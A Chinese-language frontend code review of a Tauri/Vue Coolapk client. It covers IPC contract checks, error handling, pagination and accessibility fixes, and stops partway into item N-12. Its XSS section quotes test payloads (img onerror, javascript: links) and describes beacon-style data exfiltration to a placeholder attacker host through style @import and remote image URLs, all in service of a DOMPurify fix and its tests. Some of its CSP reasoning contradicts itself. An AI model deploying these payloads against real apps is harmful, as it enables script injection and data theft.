# 前端代码审查

> 审查对象：`Kuan/src/` 全部前端源码 + `src-tauri/src/lib.rs` 的命令契约
> 审查基准：commit `f445201`（阶段 1：协议层与界面骨架），工作区中他人未提交的改动不计入
> 审查时间：2026-10-31
> 审查方式：逐行阅读 + `npm run typecheck`（通过，0 错误）+ 抽出 DOM 片段在 vitest/jsdom 里实测验证修复方案

---

## 结论

**不可发布。**

前后端通信契约是**完全对齐**的——7 个命令名、全部参数名（含 `challenge_id → challengeId`）逐一核对无一处不匹配，这是本次审查的好消息；
但 **FeedDetailPage.vue 的 `v-html` 把外站原始 HTML 直接注入 WebView，而 WebView 里持有 IPC 通道**，属于可提权到"任意 Rust 命令"的高危漏洞；
叠加"错误路径上错误横幅永远不消失"、`sessionInfo()` 返回值契约不成立、搜索与首页分页能力缺失，当前版本不具备发布条件。

| 判定项 | 结果 |
| --- | --- |
| 通信契约（命令名 / 参数名） | ✅ 7/7 命令、11/11 参数完全匹配 |
| 通信契约（返回值结构） | ❌ `session_info` 不满足 TS 声明的 `SessionInfo` |
| XSS | ❌ 高危（可提权到 IPC） |
| 错误处理 | ⚠️ 9 种 `kind` 全覆盖，但重试不可用、`Result<_, String>` 被吞 |
| 分页边界 | ⚠️ 首页有"无更多"死路；搜索**没有分页**（只有第 1 页） |
| 可访问性 | ⚠️ 卡片用 `div @click` 不可键盘操作；错误不播报 |
| 类型检查 | ✅ `vue-tsc --noEmit` 通过 |

---

## 通信契约核对表（逐命令逐参数）

### 0. 前置事实（已验证，不是推测）

在 `tauri-macros-2.6.3/src/command/wrapper.rs` 中确认：

```rust
// wrapper.rs:51   默认值
argument_case: ArgumentCase::Camel,
// wrapper.rs:505-507
match attributes.argument_case {
    ArgumentCase::Camel => { key = key.to_lower_camel_case(); }
```

结论：**Tauri 2 默认把 Rust 形参名转成 lowerCamelCase 去 `args` 对象里取值**。
因此 `submit_validation(challenge_id, ...)` 在前端必须写 `{ challengeId: ... }`，写 `challenge_id` 会反序列化失败。

同时确认生成的 handler 签名是 `fn(ctx, invoke: Invoke<R>) -> bool`：
命令返回 `Result<T, E>` 时，`Ok` 会把 `T` 放进 `invoke.resolve(...)`，`Err` 会把 `E` 放进 `invoke.reject(...)` —— 这就是下文"错误被吞"的技术依据。

### 1. 命令名与参数（全部匹配 ✅）

| # | Rust 命令（`lib.rs`） | Rust 形参 | Tauri 期望的 IPC key | 前端调用（`src/api/index.ts`） | Rust 返回类型 | 前端 `invoke<T>` 泛型 | 判定 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | `browse` :56 | `target: String` | `target` | `browse()` :92 `{ target, page }` | `Result<InvokeResult<Value>, String>` | `InvokeResult<FeedPage>` | ✅ |
|   | | `page: u32` | `page` | 同上 | | | ✅ |
| 2 | `detail` :76 | `id: String` | `id` | `detail()` :96 `{ id }` | `Result<InvokeResult<Value>, String>` | `InvokeResult<Record<string, unknown>>` | ✅ |
| 3 | `replies` :95 | `id: String` | `id` | `replies()` :100 `{ id, page }` | `Result<InvokeResult<Value>, String>` | `InvokeResult<FeedPage>` | ✅ |
|   | | `page: u32` | `page` | 同上 | | | ✅ |
| 4 | `search` :115 | `keyword: String` | `keyword` | `search()` :104 `{ keyword, page }` | `Result<InvokeResult<Value>, String>` | `InvokeResult<FeedPage>` | ✅ |
|   | | `page: u32` | `page` | 同上 | | | ✅ |
| 5 | `session_info` :135 | 无（仅 `State`） | — | `sessionInfo()` :108 无参 | `Result<Value, String>` | `SessionInfo`（**未包 `InvokeResult`**） | ⚠️ 见 S-02 |
| 6 | `submit_validation` :145 | `challenge_id: String` | **`challengeId`** | `submitValidation()` :116 `{ challengeId, field, validate }` | `Result<bool, String>` | `boolean` | ✅ **最关键的一条，正确** |
|   | | `field: String` | `field` | 同上 | | | ✅ |
|   | | `validate: String` | `validate` | 同上 | | | ✅ |
| 7 | `import_shuzlm_id` :160 | `text: String` | `text` | `importShuzlmId()` :120 `{ text }` | `Result<(), String>` | `void` | ✅ |

**`generate_handler!` 清单（lib.rs:182-190）**：`browse, detail, replies, search, session_info, submit_validation, import_shuzlm_id` —— 与上表 7 条一一对应，**无遗漏、无多余、无拼写错误**。
`@tauri-apps/api` 的 `invoke` 用的是**原始命令名**，不做任何大小写转换；命令名本身都是单单词 snake_case，不存在命令名层的转换风险。

### 2. 返回值结构核对

| 结构 | Rust 定义 | 实际序列化形态 | TS 声明 | 判定 |
| --- | --- | --- | --- | --- |
| `InvokeResult<T>` | `lib.rs:29-34` `{ ok, data: Option<T>, error: Option<Error> }` | `{"ok":true,"data":{…},"error":null}` | `index.ts:4-8` 一致 | ✅ |
| `Error` | `error.rs:88-117` `#[serde(tag = "kind", rename_all = "snake_case")]` | `network`(带 `message`) / `http`(带 `status`) / `business` / `captcha_needed`(带 `challenge`) / `auth_required` / `rate_limited` / `client_upgrade` / `risk_control` / `parse` | `index.ts:15-24` 9 个变体全列出、字段全对 | ✅ **9/9 覆盖，无遗漏** |
| `CaptchaChallenge` | `error.rs:12-16` `{ id, field }` | `{"id":"…","field":"_v2_post_token"}` | `index.ts:10-13` `{ id, field }` | ✅ |
| `SessionInfo` | `client.rs:246-254` `serde_json::json!({ challengeId, challengeField, szlmId, userAgent })` | 同左，**裸对象** | `index.ts:26-31` 同名同类型 | ⚠️ 字段对，**包装层不对**（S-02） |
| 详情公开页兜底 | `client.rs:226-230` `{ isPublic: true, sourceUrl, html }` | 同左，经 `InvokeResult` 包一层 | `Record<string, unknown>` + `str(content.html)` | ✅（但内容不可信，见 S-01） |
| 列表 `data` | `client.rs:178` 直接返回服务端 `Value` | 服务端原始 JSON | `{ data?: Array<…> ; [k]: unknown }` | ✅（宽松但安全） |

> 说明：`Error` 上的 `#[error(...)]`（thiserror Display）**不会**被序列化，所以 `Network` 的 `message` 来自字段本身（`error.rs:92`），前端拿得到；这与 `ARCHITECTURE.md §6` 说的"序列化后前端拿到 `{kind, message, retryable}`"不一致——`retryable` 不是字段，是方法（`error.rs:121`），但前端自己也实现了同名 getter（`index.ts:43-45`），结果一致，**不构成 bug**。只是文档描述不准确，见 N-08。

---

## 严重问题

### S-01 —— `v-html` 注入外站原始 HTML，可提权至任意 IPC 调用（XSS）

**位置**：`src/pages/FeedDetailPage.vue:60`

```vue
<div class="public-html" v-html="str(content.html)" />
```

**数据来源**（`src-tauri/src/client.rs:222-230`）：`GET https://www.coolapk.com/feed/{id}` 的**整页 HTML 原文**，未经任何解析，原封不动塞进 `html` 字段，再经 `detail` 命令回到前端，直接 `innerHTML`。

**真实风险等级：高（High），且不是"理论风险"。** 理由逐条：

1. **注入点确定**：`v-html` 等价于 `el.innerHTML = html`，没有 Sanitizer、没有 CSP 拦截（见第 3 点）。
2. **可被攻击者控制**：公开分享页是**用户生成内容**——动态正文、评论、用户名都可以被任意酷安用户写入，且正文允许 HTML。这是"攻击者可控字符串 → innerHTML"的标准 XSS 链路，不依赖酷安自身被拖库。
3. **CSP 挡不住**：`src-tauri/tauri.conf.json` 的 `security.csp` 是
   `default-src 'self'; …; style-src 'self' 'unsafe-inline'; …; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost`
   - `<!doctype>` 页面里的内联 `<script>` 会被 `script-src 'self'` 拦下 ✅
   - **但 `<img src=x onerror=…>`、`<svg onload=…>`、`<iframe srcdoc=…>` 这类事件处理器是内联脚本，同样会被拦** ✅ —— 这是本项目唯一还在生效的防线；
   - 真正危险的是 **`<style>` 完全没有被限制**（`style-src` 允许 `'unsafe-inline'`，且 `FORBID` 不生效），攻击者可以 `body{display:none}` + 伪元素覆盖一个全屏"输入密码"的假 UI（**UI 欺骗 / Clickjacking**），也可以 `<style>@import url(https://attacker/…)</style>` 做外带信标（`style-src` 不允许远程，但 `img-src https:` 允许，攻击者用 `<img src="https://attacker/?c=…">` 即可）；
   - **最致命的是 CSP 没有 `frame-src`，`default-src 'self'` 会兜底，但这不改变另一条事实：只要哪天为了"样式"放宽，`style-src`/`img-src` 已经在放行远程资源**。
4. **真正的提权面在 IPC**：Tauri 2 的前端运行环境里 `window.__TAURI_INTERNALS__.invoke` 是全局可见的。一旦拿到任意 JS 执行（哪怕只是通过一次未来被引入的第三方脚本、或未来把 CSP 放宽一次），攻击者拿到的不是"一个网页的 cookie"，而是 `invoke('import_shuzlm_id', …)` 这类**能改写持久化设备身份**的命令，以及全部 `browse/search/detail` 带来的用户数据读取。**这是"XSS 从网页级升格为本地应用级"的典型场景。**
5. **已经装好了却没用的依赖**：`package.json:22` 已经依赖 `dompurify ^3.2.0`（实际安装 3.4.17），但 `src/` 里 **0 处引用**。

**修复方案（已在 vitest/jsdom 实测通过，输出见下）**

新增 `src/utils/sanitize.ts`：

```ts
import DOMPurify from 'dompurify'

/// 公开页 HTML 里对正文没有意义、但对攻击者很有用的标签
const FORBID_TAGS = [
  'style', 'form', 'input', 'button', 'textarea', 'select',
  'iframe', 'object', 'embed', 'base', 'link', 'meta',
]

/// 把来自 www.coolapk.com 的原始 HTML 清洗成可安全 v-html 的片段。
export function sanitizePublicHtml(raw: string): string {
  if (!raw) return ''
  // 先只取 <body>，去掉 <head>/<meta>/<title> 等整页结构
  const body = new DOMParser().parseFromString(raw, 'text/html').body

  const cleaned = DOMPurify.sanitize(body.innerHTML, {
    USE_PROFILES: { html: true },
    FORBID_TAGS,
    FORBID_ATTR: ['ping', 'integrity'],
    ALLOW_DATA_ATTR: false,
  })

  // 外链一律新窗口 + noopener，避免被渲染成"应用内跳转"
  const holder = document.createElement('div')
  holder.innerHTML = cleaned
  holder.querySelectorAll('a[href]').forEach((a) => {
    a.target = '_blank'
    a.rel = 'noopener noreferrer'
  })
  holder.querySelectorAll('img[src]').forEach((img) => {
    img.loading = 'lazy'
    img.referrerPolicy = 'no-referrer'
  })
  return holder.innerHTML
}
```

`FeedDetailPage.vue` 改动（只改这一处）：

```diff
-import { onMounted, ref } from 'vue'
+import { computed, onMounted, ref } from 'vue'
 import { useRoute, useRouter } from 'vue-router'
 import { detail, replies, type FeedPage } from '../api'
+import { sanitizePublicHtml } from '../utils/sanitize'
 …
 const replyError = ref<unknown>(null)
+// 只对公开页兜底内容做清洗；null 安全
+const publicHtml = computed(() => sanitizePublicHtml(str(content.value?.html)))
@@
-        <div class="public-html" v-html="str(content.html)" />
+        <div class="public-html" v-html="publicHtml" />
```

**实测结果**（`vitest` + `jsdom@25` + `dompurify@3.4.17`，用上面的 `sanitize.ts` 逐字执行）：

| 输入 | 输出 |
| --- | --- |
| `<p onclick="x()">hi</p><img src=x onerror=alert(1)><a href="/u/1">u</a><style>body{display:none}</style><form><input name=a></form>` | `<p>hi</p><img src="x"><a href="/u/1" target="_blank" rel="noopener noreferrer">u</a>` |
| `<p onclick="x()">hi</p><img src=x onerror=alert(1)><a href="javascript:alert(1)">a</a><script>alert(1)</script><style>body{display:none}</style>` | `<p>hi</p><img src="x"><a>a</a>` |

→ `onerror` / `onclick` / `javascript:` 全部剥离，`<script>` / `<style>` / `<form>` 整段消失，正常图文与站内相对链接保留。

**必须同时加的回归测试** `src/utils/sanitize.test.ts`（属于上文的修复，不是源码改动）：

```ts
import { describe, expect, it } from 'vitest'
import { sanitizePublicHtml } from './sanitize'

describe('sanitizePublicHtml', () => {
  it('剥离脚本、事件属性与 javascript: 链接', () => {
    const out = sanitizePublicHtml(
      '<img src=x onerror=alert(1)><a href="javascript:alert(1)">a</a><script>alert(1)</script>',
    )
    expect(out).not.toMatch(/onerror|javascript:/i)
    expect(out).not.toContain('<script')
  })

  it('保留正文并强化外链', () => {
    const out = sanitizePublicHtml('<a href="https://www.coolapk.com/u/1">@a</a>')
    expect(out).toContain('noopener noreferrer')
  })
})
```

**纵深防御（强烈建议，与上面并行）**：`src-tauri/tauri.conf.json` 的 CSP 里，把 `img-src` 的 `https:` 收窄到 `https://*.coolapk.com`，并显式加 `frame-src 'none'; object-src 'none';`。当前 `img-src … https:` 允许任意远程图片，等于给攻击者留了"像素级外带信标"的出口。

> **为什么不能只靠 DOMPurify**：DOMPurify 解决"标签/属性"层面，CSP 解决"就算漏了一个"的兜底，两者缺一不可。当前**两个都在裸奔**（一个没用，一个 `style-src` 放行 + `img-src https:` 放行）。

### S-02 —— `sessionInfo()` 的返回值契约不成立，且把错误伪装成空数据

**位置**：`src/api/index.ts:107-109` ↔ `src-tauri/src/lib.rs:134-141` ↔ `src-tauri/src/client.rs:246-254`

```ts
// 前端声明
export function sessionInfo() {
  return invoke<SessionInfo>('session_info')   // 无 { ok, data, error } 包装
}
```

```rust
// lib.rs:135
pub fn session_info(state: State<'_, AppState>) -> Result<serde_json::Value, String> {
    let client = state.client.lock().map_err(|_| "内部状态锁失败".to_string())?;
    Ok(client.session_info())      // 裸 Value，不走 InvokeResult
}
```

问题有三层：

1. **包装不一致**：其余 4 个读命令都返回 `InvokeResult<T>`，唯独 `session_info` 返回裸对象。前端 `invoke<SessionInfo>` 的类型断言**能通过 typecheck**（因为 Rust 端类型对 TS 不可见），但这是"类型系统在说谎"。
2. **错误被吞成空数据**：`state.client.lock()` 失败时命令 `reject("内部状态锁失败")`，`SettingsPage.vue:13-15` 的 `catch { info.value = null }` 不区分"锁失败"与"后端返回 null"，用户永远看不到"内部错误"；同时 `invoke` 抛出的 `String` 不是 `ApiError`，`ErrorBox` 会显示成"发生未知错误"。
3. **`null` 字段与 TS 类型不符却静默通过**：`client.rs:249-250` 的 `pending.map(...)` 在无 pending 时序列化为 `null`，TS 写的是 `challengeId: string | null` —— ✅ 这点是对的。但 `szlmId` / `userAgent` 若 `json!` 里任何一处异常，前端只会看到 `undefined` 被 `??` 兜住成"读取中…"（`SettingsPage.vue:53,57`），**永远停在"读取中…"没有任何提示**。

**修复方案**：让 `session_info` 与其他命令同构。

```rust
// lib.rs
#[tauri::command]
pub fn session_info(state: State<'_, AppState>) -> Result<InvokeResult<serde_json::Value>, String> {
    let client = state.client.lock().map_err(|_| "内部状态锁失败".to_string())?;
    Ok(InvokeResult::success(client.session_info()))
}
```

```ts
// src/api/index.ts
export function sessionInfo() {
  return call<SessionInfo>('session_info')
}
```

```ts
// SettingsPage.vue —— 增加加载失败态，而不是静默 null
const infoState = ref<'loading' | 'ready' | 'failed'>('loading')
async function refresh() {
  try {
    info.value = await sessionInfo()
    infoState.value = 'ready'
  } catch (e) {
    info.value = null
    infoState.value = 'failed'
  }
}
```

模板里 `'读取中…'` 的 `??` 兜底改为按 `infoState` 分支：`loading → 读取中…`、`failed → 读取失败，点击重试`、`ready → 值`。

> 如果短期不动 Rust，至少在前端把 `invoke<SessionInfo>` 包一层 `try/catch` 并把 `String` 错误转成 `ApiError({kind:'parse', message})`。

### S-03 —— 错误态一旦出现就再也回不到内容（"幽灵错误横幅"）

**位置**：`src/pages/HomePage.vue:50, 52-59`

```vue
<ErrorBox v-if="error" :error="error" @retry="load(true)" />
<template v-else>
  <LoadingList v-if="loading && items.length === 0" />
  <template v-else> …列表… </template>
</template>
```

`error` 只在 `load()` **进入时**（:26）被清空。而 `load()` 里 `catch` 之后没有"刷新成功则清空"的可能——因为整个块被 `v-if="error"` 短路了。

真实后果链：

1. 首次加载失败 → 显示 `ErrorBox`；
2. 用户点"重试" → `load(true)` 把 `error=null`、`loading=true`；
3. 如果这次又失败 → 回到 `ErrorBox`，OK；
4. **但如果用户在 `ErrorBox` 显示期间点了顶部"刷新"按钮**（`HomePage.vue:47`，`:disabled="loading"` 在 `ErrorBox` 分支下 `loading=false`，所以按钮**可点**）→ 同样是 `load(true)`，会清空 `error` 重新进入 `loading`，但 `items` 已被清空、`LoadingList` 条件 `loading && items.length === 0` 为真 → 显示骨架屏；成功后 `error=null` 正常渲染 ✅。

所以严格的"永久卡死"其实不成立，**真正的问题是状态模型自相矛盾**：

- `ErrorBox` 分支下**点击"刷新"没有任何视觉反馈**（`ErrorBox` 不显示 loading），两次快速点击会并发两次 `browse`，**没有请求去重/取消**（见 N-01），后到先返会覆盖 `items`；
- `loading` 只在 `loading && items.length === 0` 时渲染骨架，**`items` 非空时的"刷新中"完全不可见**（用户以为没反应），`HomePage.vue:53` 的条件把"二次加载"的反馈吃掉了；
- `error.vue` 分支存在时 `<template v-else>` 整块不渲染，**即使 `items` 里已有数据也全部消失**——一次翻页失败会把已加载的 20 条内容清空显示为错误页（`load(false)` 失败分支没有保护 `items`）。

**修复方案**（统一状态机，三态不互斥）：

```vue
<script setup lang="ts">
const loading = ref(true)      // 首屏/刷新
const loadingMore = ref(false) // 翻页
…
</script>

<template>
  <div class="page">
    <div class="toolbar">
      <h2>首页</h2>
      <button class="btn" :disabled="loading || loadingMore" @click="load(true)">
        {{ loading ? '加载中…' : '刷新' }}
      </button>
    </div>

    <!-- 已有内容时，错误只做内联提示，不吞掉列表 -->
    <ErrorBox v-if="error && items.length === 0" :error="error" @retry="load(true)" />
    <p v-else-if="error" class="inline-error">加载更多失败：{{ messageOf(error) }}</p>

    <LoadingList v-if="loading && items.length === 0" />
    <template v-else>
      <FeedItem v-for="item in items" :key="keyOf(item)" :item="item" />
      <div v-if="items.length === 0 && !error" class="state">暂无内容</div>
      <div v-else-if="!hasMore" class="state">没有更多了</div>
      <button v-else-if="hasMore" class="btn" :disabled="loadingMore" @click="load(false)">
        {{ loadingMore ? '加载中…' : '加载更多' }}
      </button>
    </template>
  </div>
</template>
```

`load()` 同时加并发守卫（见 N-01）。

---

## 一般问题

### N-01 —— 并发请求无去重，双击"刷新"会重复请求并覆盖结果

**位置**：`src/pages/HomePage.vue:19-38`（`load`）、`src/pages/SearchPage.vue:19-34`（`run`）

`load()` 只判断 `loading` 用于禁用按钮，但 `@click="load(true)"` 与 `onMounted(() => load(true))`、`ErrorBox @retry` 三个入口之间没有序列化；`await browse(...)` 返回时**不校验这是不是最新一次请求**（无 requestId / AbortController 语义）。

**修复**：

```ts
let reqId = 0
async function load(reset = false) {
  const my = ++reqId
  if (loading.value && !reset) return      // 翻页去重
  …
  try {
    const res = await browse('home', page.value)
    if (my !== reqId) return                // 过期响应丢弃
    …
  } finally {
    if (my === reqId) loading.value = false
  }
}
```

### N-02 —— 首页翻页"没有更多了"是死路，且没有触发入口

**位置**：`src/pages/HomePage.vue:31-32, 55-57`

```ts
hasMore.value = next.length > 0
if (next.length > 0) page.value += 1
```

三处问题：

1. **永远无法恢复**：`hasMore` 只在 `load(true)` 里被重置为 `true`（:22），而 `load(true)` 只由"刷新"按钮和 `ErrorBox` 触发；一旦某页返回 `[]`，页面显示"没有更多了"，**界面上再无任何"加载更多"按钮**——即使服务端后来有数据，用户也只能刷新回第一页。
2. **没有翻页触发器**：模板里没有任何 `load(false)` 的调用点。`page` 会随"刷新"重置为 1，所以**在当前 UI 下 `page>1` 的分支永远不会被执行**——`browse('home', page)` 的翻页逻辑是**死代码**。
3. **空页判定过严**：服务端返回 `{ code: 200, data: [] }` 与 `{ code: 200 }`（无 `data` 字段）都被判为"没有更多"，但酷安首页末页有时会返回带元数据、`data` 为 `[]` 的响应；更严重的是 `error.rs:133-166` 的 `is_success` 允许 `data` 缺失，`classify` 又因为 `has_data=false && message 为空` 不报错 → 前端拿到 `{}` 静默判"没有更多"。

**修复**：模板加"加载更多"按钮（见 S-03 的模板），`hasMore` 判定改为"本页返回条数为 0 **且** 页码已达上限"：

```ts
const PAGE_LIMIT = 50
hasMore.value = next.length > 0 && page.value <= PAGE_LIMIT
```

并把 `next.length === 0` 与"响应缺 data 字段"区分开：

```ts
const hasDataField = Array.isArray((res as FeedPage)?.data)
if (!hasDataField) throw new ApiError({ kind: 'parse', message: '列表响应缺少 data 字段' })
```

### N-03 —— 搜索完全没有分页：只能看到第 1 页

**位置**：`src/pages/SearchPage.vue:26`

```ts
const res = await search(kw, 1)     // 硬编码页码 1
```

`api.search(keyword, page = 1)` 支持页码，但页面**永远只请求第 1 页**，也没有"加载更多"。对搜索结果动辄几十页的场景，这是功能缺失而非优化项。
另外 `SearchPage.vue:20-21` 空关键词直接 `return`，**没有任何提示**（`searched` 保持 `false`，界面停在"输入关键词后按回车或点击搜索"——用户以为点击失败）。

**修复**：复用 N-02 的分页模式，关键词变化时 `run(true)`；空关键词时设置 `error` 或内联提示：

```ts
if (!kw) {
  hint.value = '请输入搜索关键词'
  return
}
```

### N-04 —— Rust 侧 `Result<_, String>` 的错误被 `invoke` 抛出后无法分类

**位置**：`src/api/index.ts:75-83`、`src-tauri/src/lib.rs` 全部命令的 `map_err(|_| "内部状态锁失败".to_string())`

`call()` 只处理 `res.ok === false` 的情况；当命令**本身** `reject`（锁失败、`import_shuzlm_id` 的 `Err(String)`）时，`invoke` 抛出一个**裸字符串**：

- `ErrorBox.vue:14` 命中 `catch-all` → 显示"发生未知错误"，**丢了真实原因**（"内部状态锁失败"、"未找到 ShuzlmID"等对用户是有意义的）；
- `SettingsPage.vue:34` 用 `e instanceof Error ? e.message : String(e)` —— 这里恰好能显示字符串，但错误风格与其他页不一致。

**修复**：在 `call` 和每个裸 `invoke` 外包一层统一转换。

```ts
export class CommandError extends ApiError {
  constructor(message: string) {
    super({ kind: 'parse', message })
    this.name = 'CommandError'
  }
}

async function call<T>(cmd: string, args: Record<string, unknown> = {}): Promise<T> {
  let res: InvokeResult<T>
  try {
    res = await invoke<InvokeResult<T>>(cmd, args)
  } catch (raw) {
    // Rust 侧 Err(String) 原样抛到这里
    const text = typeof raw === 'string' && raw ? raw : '本地命令调用失败'
    throw new ApiError({ kind: 'parse', message: text })
  }
  if (!res.ok) throw new ApiError(res.error ?? { kind: 'parse', message: '后端未返回错误详情' })
  return res.data as T
}
```

> 注意：`errorMessage()` 的 `default` 分支（`index.ts:70-71`）对 `parse` 类型**不会**用到 `detail.message`，因为 `case 'parse'` 在前面已返回"服务器响应格式异常"。上面的 `CommandError` 若走 `errorMessage` 会丢消息。因此需要把 `parse` 分支改为优先使用后端消息：
>
> ```ts
> case 'parse':
>   return (detail as { message?: string }).message || '服务器响应格式异常'
> ```

### N-05 —— `submit_validation` / 验证码链路前端完全未接线（契约正确但功能缺失）

**位置**：`src/api/index.ts:111-117`（已导出）、`src/api/index.ts:47-49`（`needsCaptcha` 已实现）——但 `needsCaptcha` **全项目 0 处引用**。

现状：

- `ErrorBox.vue:10-15` 只区分 `retryable`，`captcha_needed` 的 `retryable` 为 `false`（`['network','http','rate_limited']`），所以**用户看到"请求需要人机验证"，但没有任何可点的按钮**，且 `captcha_needed` 的重试也无意义（没有凭证，重试必然再失败）；
- `submitValidation()` 从未被调用；`sessionInfo()` 里的 `challengeId/challengeField` 从未被 UI 读取；
- 叠加 `docs/PROTOCOL.md §13` 实测结论"游客态所有接口稳定 1004"，**当前版本对真实用户基本等于不可用**。

**修复**（最小可行）：`ErrorBox` 增加验证码分支。

```vue
<script setup lang="ts">
// 新增
const props = defineProps<{ error: unknown }>()
const emit = defineEmits<{ retry: []; captcha: [] }>()
const needsCaptcha = computed(() => props.error instanceof ApiError && props.error.needsCaptcha)
</script>

<template>
  <div class="error-box" role="alert" aria-live="assertive">
    <div class="icon" aria-hidden="true">!</div>
    <p class="message">{{ describe(props.error).message }}</p>
    <button v-if="needsCaptcha" class="btn btn-primary" @click="emit('captcha')">完成人机验证</button>
    <button v-else-if="describe(props.error).retryable" class="btn btn-primary" @click="emit('retry')">重试</button>
  </div>
</template>
```

并在 `App.vue` 或页面级监听 `captcha` 事件 → 打开验证 WebView → 拿到 `validate` → `submitValidation(challengeId, field, validate)` → 再 `load(true)`。
（验证窗口本身属于 Rust/独立 WebView 的工作，前端这里只需把事件链路接通。）

### N-06 —— `FeedItem.vue` 用 `div` + `@click` 承担导航，键盘不可达

**位置**：`src/components/FeedItem.vue:39`

```vue
<article class="card feed-item" @click="open">
```

- `<article>` 不可聚焦、无 `role`、无 `tabindex`，**Tab 键走不到，回车/空格无法打开**；屏幕阅读器不会朗读"可点击"；
- 列表 `key` 用索引（`HomePage.vue:55`、`SearchPage.vue:57`、`FeedDetailPage.vue:78`）：翻页插入/刷新后索引复用，Vue 会错误复用节点；
- `FeedItem.vue:24` `avatime` 疑似 `dateline` 的拼写失误（时间字段），变量名不影响功能但会误导后续维护。

**修复**：

```vue
<article
  class="card feed-item"
  role="link"
  tabindex="0"
  :aria-label="`${username || '匿名'}的动态：${summary || '无文本内容'}`"
  @click="open"
  @keydown.enter.prevent="open"
  @keydown.space.prevent="open"
>
```

```ts
// 父组件：稳定的业务 key，而不是索引
function keyOf(it: Record<string, unknown>, i: number): string {
  return String(it.id ?? it.entityId ?? it.feedId ?? `idx-${i}`)
}
```

```vue
<FeedItem v-for="(item, i) in items" :key="keyOf(item, i)" :item="item" />
```

### N-07 —— 错误态缺少 `role="alert"` / `aria-live`，异步错误对读屏用户完全静默

**位置**：`src/components/ErrorBox.vue:19`、`src/components/LoadingList.vue:8`

`ErrorBox` 是一个普通 `div`；`LoadingList` 的骨架屏也没有 `aria-busy` / `role="status"`。所有加载与错误都是异步发生的，读屏用户得不到任何信号。

**修复**：

```vue
<!-- ErrorBox.vue -->
<div class="error-box" role="alert" aria-live="assertive">
```

```vue
<!-- LoadingList.vue -->
<div role="status" aria-busy="true" aria-label="加载中">
  <div v-for="i in count ?? 4" :key="i" class="skeleton" />
</div>
```

### N-08 —— `ApiError.errorMessage` 对 `business` 之外的自定义消息会在 `default` 掉进 `unknown` 分支的绕路写法

**位置**：`src/api/index.ts:52-73`

`errorMessage` 的 `switch` **没有 `case 'business'`**，依赖 `default` 分支读取 `(detail as { message?: string }).message`（:71）。这在 TypeScript 下需要类型断言才能编译（已通过），但：

- `BackendError` 是一个**可穷举的联合类型**，用 `default` 兜底会**悄悄吞掉未来新增的 `kind`**（Rust 加了第 10 种变体，前端编译期不会报错，运行时显示"未知错误"）；
- `case 'parse'` 固定返回"服务器响应格式异常"，**丢掉了 Rust 端 `Parse { message }` 的诊断信息**（例如 `client.rs:183-185` 的"未知浏览目标: xxx"），排查线上问题时这条信息很关键。

**修复**：显式列全 + `never` 检查。

```ts
export function errorMessage(detail: BackendError): string {
  switch (detail.kind) {
    case 'network':      return '连接失败，请检查网络后重试'
    case 'http':         return `请求失败（HTTP ${detail.status}）`
    case 'business':     return detail.message || '服务器未能完成请求，请稍后重试'
    case 'captcha_needed': return '请求需要人机验证'
    case 'auth_required':  return '登录状态已失效，请重新登录'
    case 'rate_limited':   return '请求过于频繁，请稍后重试'
    case 'client_upgrade': return '当前客户端协议未被接受，请更新客户端'
    case 'risk_control':   return '服务端检测到网络环境异常'
    case 'parse':          return detail.message || '服务器响应格式异常'
    default: {
      const _exhaustive: never = detail
      return _exhaustive
    }
  }
}
```

（对应地，`ApiError` 的 `retryable` 也可以一并从这里派发，避免 `includes` 的字符串数组在新增 kind 时漏项。）

### N-09 —— `retryable` 判定把 `http` 一律当作可重试

**位置**：`src/api/index.ts:43-45`

```ts
return ['network', 'http', 'rate_limited'].includes(this.detail.kind)
```

Rust 侧 `client.rs:163-170` 把 **403 映射为 `Error::Http { status: 403 }`**，而 `ErrorBox` 会给 403 显示"重试"按钮。403 在这个项目里是**协议/WAF 拒绝**（`docs/PROTOCOL.md §13` 实测：UA 残缺、协议版本 13.4.1 均返回 403），**重试 100% 再失败**，还会白白多打请求。Rust 侧 `Error::retryable()`（`error.rs:121-126`）同样把 `Http` 全算可重试，两边一致地错。

**修复**：

```ts
get retryable(): boolean {
  switch (this.detail.kind) {
    case 'network':
    case 'rate_limited':
      return true
    case 'http':
      return this.detail.status >= 500 || this.detail.status === 408 || this.detail.status === 429
    default:
      return false
  }
}
```

### N-10 —— `detail()` 与 `replies()` 串行 await，详情页首屏被评论拖慢一倍

**位置**：`src/pages/FeedDetailPage.vue:27-35`

```ts
content.value = await detail(id)       // 先等详情
try {
  const r = await replies(id, 1)       // 再等评论
```

两条请求互不依赖（`replies` 只需要 `id`），串行会让首屏等待时间 = 两者之和。另外 Rust 侧 `CoolapkClient` 被 `Mutex` 串行化（`lib.rs:61-67`），**实际上也并发不了**——前端若要并发，必须同时改 Rust 侧锁粒度（不是本任务范围，但应在 ISSUE 中记录）。

**修复**（前端层面先改，等 Rust 放开锁后自然生效）：

```ts
const [contentRes, repliesRes] = await Promise.allSettled([
  detail(id),
  replies(id, 1),
])
if (contentRes.status === 'rejected') throw contentRes.reason
content.value = contentRes.value
if (repliesRes.status === 'fulfilled') {
  const d = (repliesRes.value as FeedPage).data
  replyList.value = Array.isArray(d) ? d : []
} else {
  replyError.value = repliesRes.reason
}
```

### N-11 —— 详情页评论"重试"实际会重载整页，且失败时旧评论被保留得不明不白

**位置**：`src/pages/FeedDetailPage.vue:76`

```vue
<ErrorBox v-if="replyError" :error="replyError" @retry="load" />
```

评论加载失败后点"重试"，`load()` 会**同时重新请求详情**，把已经渲染好的正文重新变回骨架屏（`loading=true` → `FeedDetailPage.vue:50` 的 `LoadingList` 覆盖整页）。而 `replyError` 在 `load()` 开头被清空（:25），`replyList` 却**没有被清空**，会出现"错误消失 → 显示旧评论 → 又闪回错误"的跳动。

**修复**：拆出 `loadReplies(id)` 单独重试，并让详情与评论的错误各自独立渲染（模板已基本具备，只需换事件）。

```ts
async function loadReplies(id: string) {
  replyError.value = null
  try {
    const r = await replies(id, 1)
    const d = (r as FeedPage).data
    replyList.value = Array.isArray(d) ? d : []
  } catch (e) {
    replyError.value = e
  }
}
```

```vue
<ErrorBox v-if="replyError" :error="replyError" @retry="loadReplies(String(route.params.id ?? ''))" />
```

### N-12 —— `str()` 把数字强转字符串，会让 `isPublic` 这类布尔判定之外的数字字段被误渲染

**位置**：`src/pages/FeedDetailPage.vue:17-19`、`src/components/FeedItem.vue:11-18`

